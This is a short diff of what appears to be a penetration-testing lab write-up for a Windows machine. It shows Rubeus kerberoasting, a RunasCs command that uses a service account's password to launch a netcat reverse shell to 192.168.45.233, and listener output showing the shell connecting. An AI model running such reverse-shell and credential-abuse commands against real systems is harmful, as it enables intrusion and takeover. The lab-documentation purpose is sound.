@@ -254,8 +254,7 @@ PS C:\xampp\htdocs\uploads> ./Rubeus.exe kerberoast /nowrap
 - `invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc.exe 192.168.45.233 1234 -e cmd.exe'`
     #### OUTPUT
     ```bash
-    ┌──(G1㉿G1)-[~]
-    └─$ nc -nvlp 1234
+    nc -nvlp 1234
     listening on [any] 1234 ...
     connect to [192.168.45.233] from (UNKNOWN) [192.168.182.187] 50722
     Microsoft Windows [Version 10.0.17763.2746]
@@ -313,6 +312,5 @@ C://Windows NT SERVICE\TrustedInstaller:(F)
             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
 ```
 - Now we go to Administrator's Desktop and grab the flag
-#### Privelage Escalating to System
 
 # SOLVED!
